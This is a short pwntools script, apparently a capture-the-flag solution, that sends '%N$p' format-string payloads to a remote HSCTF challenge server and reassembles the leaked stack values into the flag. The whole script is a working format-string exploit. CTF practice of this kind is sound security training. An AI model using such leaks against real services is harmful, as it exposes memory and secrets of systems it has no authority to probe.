from pwn import *

#p = process("./chall")
p = remote("cat.hsctf.com", 1337)
b = bytearray()
for i in range(1, 20):
	p.sendline(f"%{i}$p".encode())
	try:
		b += p32(int(p.recvline(), 16))
	except ValueError:
		pass
print(b[b.index(b"flag{"):b.index(b"}") + 1].decode())
